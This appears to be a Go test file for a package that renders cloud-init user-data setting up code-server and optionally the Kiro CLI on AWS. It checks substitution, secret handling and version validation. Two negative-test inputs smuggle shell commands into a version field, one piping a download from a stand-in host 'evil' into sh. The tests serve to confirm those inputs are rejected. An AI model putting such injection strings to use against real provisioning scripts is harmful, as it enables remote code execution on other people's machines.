package userdata

import (
	"os/exec"
	"strings"
	"testing"

	"github.com/ukaji3/nakama/internal/kiro"
)

func TestRenderCodeServer_Substitutes(t *testing.T) {
	t.Parallel()

	got, err := RenderCodeServer(CodeServerParams{
		InstanceName:         "dev01",
		Region:               "ap-northeast-1",
		Port:                 8080,
		SSMPasswordParameter: "/nakama/dev01/code-server/password",
		SSMVersionParameter:  "/nakama/dev01/code-server/version",
		PinnedVersion:        "",
	})
	if err != nil {
		t.Fatalf("RenderCodeServer returned unexpected error: %v", err)
	}

	wantSubstrings := []string{
		`INSTANCE_NAME="dev01"`,
		`REGION="ap-northeast-1"`,
		`PORT="8080"`,
		`PASSWORD_PARAM="/nakama/dev01/code-server/password"`,
		`VERSION_PARAM="/nakama/dev01/code-server/version"`,
		`PINNED_VERSION=""`,
		`bind-addr: 0.0.0.0:`,
		`auth: password`,
		`code-server@`,
		`export HOME="${HOME:-/root}"`,
		// AWS CLI v2 is installed from snap (not the legacy apt awscli),
		// and referenced via its absolute snap path from non-login shells.
		`snap install aws-cli --classic`,
		`/snap/bin/aws ssm get-parameter`,
		`ln -sf /snap/bin/aws /usr/local/bin/aws`,
	}
	for _, s := range wantSubstrings {
		if !strings.Contains(got, s) {
			t.Errorf("rendered userdata is missing %q", s)
		}
	}

	// The legacy apt awscli (v1) must not be installed.
	if strings.Contains(got, "install -y curl ca-certificates jq awscli") {
		t.Errorf("rendered userdata still installs the apt awscli package")
	}
}

func TestRenderCodeServer_PinnedVersion(t *testing.T) {
	t.Parallel()

	got, err := RenderCodeServer(CodeServerParams{
		InstanceName:         "dev02",
		Region:               "ap-northeast-1",
		Port:                 8080,
		SSMPasswordParameter: "/nakama/dev02/code-server/password",
		SSMVersionParameter:  "/nakama/dev02/code-server/version",
		PinnedVersion:        "4.95.3",
	})
	if err != nil {
		t.Fatalf("RenderCodeServer returned unexpected error: %v", err)
	}
	if !strings.Contains(got, `PINNED_VERSION="4.95.3"`) {
		t.Errorf("rendered userdata does not contain pinned version 4.95.3")
	}
}

// TestRenderCodeServer_PasswordBlockNotTraced pins the CWE-532 fix:
// the block that fetches and checks the plaintext password must run
// with xtrace disabled, and tracing must resume afterwards so the
// rest of the provisioning stays debuggable.
func TestRenderCodeServer_PasswordBlockNotTraced(t *testing.T) {
	t.Parallel()

	got, err := RenderCodeServer(CodeServerParams{
		InstanceName:         "dev01",
		Region:               "ap-northeast-1",
		Port:                 8080,
		SSMPasswordParameter: "/nakama/dev01/code-server/password",
		SSMVersionParameter:  "/nakama/dev01/code-server/version",
	})
	if err != nil {
		t.Fatalf("RenderCodeServer returned unexpected error: %v", err)
	}

	off := strings.Index(got, "set +x")
	pwd := strings.Index(got, `PASSWORD="$(`)
	on := strings.LastIndex(got, "set -x")
	if off == -1 || pwd == -1 || on == -1 {
		t.Fatalf("missing markers: set +x at %d, PASSWORD at %d, set -x at %d", off, pwd, on)
	}
	if off >= pwd || pwd >= on {
		t.Errorf("password handling is not inside the xtrace-disabled block: set +x at %d, PASSWORD at %d, set -x at %d", off, pwd, on)
	}
	// The empty-password check dereferences the secret too; it must
	// sit inside the same guarded block.
	if chk := strings.Index(got, `[ -z "${PASSWORD}" ]`); chk <= off || chk >= on {
		t.Errorf("empty-password check at %d is outside the xtrace-disabled block (%d..%d)", chk, off, on)
	}
	// The config file holds the plaintext password: owner-only.
	if !strings.Contains(got, `chmod 600 "${HOME_DIR}/.config/code-server/config.yaml"`) {
		t.Errorf("rendered userdata does not chmod 600 the code-server config")
	}
}

func TestValidatePinnedVersion(t *testing.T) {
	t.Parallel()

	valid := []string{"", "4.96.4", "10.0.1"}
	for _, v := range valid {
		if err := ValidatePinnedVersion(v); err != nil {
			t.Errorf("ValidatePinnedVersion(%q) = %v, want nil", v, err)
		}
	}
	invalid := []string{
		"v4.96.4",     // prefix
		"4.96",        // too short
		"4.96.4.1",    // too long
		"latest",      // words
		"4.96.4 ",     // whitespace
		`4.96.4"; rm`, // shell metacharacters
	}
	for _, v := range invalid {
		if err := ValidatePinnedVersion(v); err == nil {
			t.Errorf("ValidatePinnedVersion(%q) = nil, want error", v)
		}
	}
}

// TestRenderCodeServer_RejectsInvalidPinnedVersion ensures the render
// path itself enforces validation, independent of CLI-side checks.
func TestRenderCodeServer_RejectsInvalidPinnedVersion(t *testing.T) {
	t.Parallel()

	_, err := RenderCodeServer(CodeServerParams{
		InstanceName:         "dev01",
		Region:               "ap-northeast-1",
		Port:                 8080,
		SSMPasswordParameter: "/nakama/dev01/code-server/password",
		SSMVersionParameter:  "/nakama/dev01/code-server/version",
		PinnedVersion:        `4"; curl evil |sh; echo "`,
	})
	if err == nil {
		t.Fatal("RenderCodeServer accepted a malformed pinned version")
	}
}

// TestRenderCodeServerInstallsKiroByDefault pins that an ordinary
// create carries the Kiro steps (Issue #68) and that they are the
// shared ones, not a second copy.
func TestRenderCodeServerInstallsKiroByDefault(t *testing.T) {
	got, err := RenderCodeServer(CodeServerParams{
		InstanceName: "dev01", Region: "ap-northeast-1", Port: 8080,
		SSMPasswordParameter: "/nakama/dev01/code-server/password",
		SSMVersionParameter:  "/nakama/dev01/code-server/version",
		InstallKiro:          true,
	})
	if err != nil {
		t.Fatalf("RenderCodeServer: %v", err)
	}
	if !strings.Contains(got, kiro.InstallScript()) {
		t.Error("the user-data must embed internal/kiro's install script verbatim")
	}
	// The official installer checks for unzip on Linux and aborts
	// without it, so the package has to be installed first.
	if !strings.Contains(got, "unzip") || !strings.Contains(got, "unar") {
		t.Errorf("the base packages must include unzip and unar:\n%s", got)
	}
	aptAt := strings.Index(got, "apt-get install -y curl")
	kiroAt := strings.Index(got, "cli.kiro.dev/install")
	if aptAt < 0 || kiroAt < 0 || aptAt > kiroAt {
		t.Error("unzip/unar must be installed before the Kiro installer runs")
	}
}

// TestRenderCodeServerNoKiro pins that --no-kiro leaves no trace at
// all: not even the section comment, which would otherwise suggest the
// install was attempted.
func TestRenderCodeServerNoKiro(t *testing.T) {
	got, err := RenderCodeServer(CodeServerParams{
		InstanceName: "dev01", Region: "ap-northeast-1", Port: 8080,
		SSMPasswordParameter: "/nakama/dev01/code-server/password",
		SSMVersionParameter:  "/nakama/dev01/code-server/version",
		InstallKiro:          false,
	})
	if err != nil {
		t.Fatalf("RenderCodeServer: %v", err)
	}
	if strings.Contains(strings.ToLower(got), "kiro") {
		t.Errorf("--no-kiro must render no Kiro content at all:\n%s", got)
	}
	// unzip stays: it is generally useful and harmless.
	if !strings.Contains(got, "unzip") {
		t.Error("unzip should remain in the base packages even without Kiro")
	}
}

// TestRenderedUserDataIsValidBash guards both variants against a syntax
// error reaching cloud-init, where it would only surface as a broken
// instance.
func TestRenderedUserDataIsValidBash(t *testing.T) {
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("bash is not available")
	}
	for _, installKiro := range []bool{true, false} {
		got, err := RenderCodeServer(CodeServerParams{
			InstanceName: "dev01", Region: "ap-northeast-1", Port: 8080,
			SSMPasswordParameter: "/p", SSMVersionParameter: "/v",
			InstallKiro: installKiro,
		})
		if err != nil {
			t.Fatalf("RenderCodeServer(InstallKiro=%v): %v", installKiro, err)
		}
		cmd := exec.Command("bash", "-n")
		cmd.Stdin = strings.NewReader(got)
		if out, cerr := cmd.CombinedOutput(); cerr != nil {
			t.Errorf("InstallKiro=%v: bash -n rejected the user-data: %v\n%s", installKiro, cerr, out)
		}
	}
}
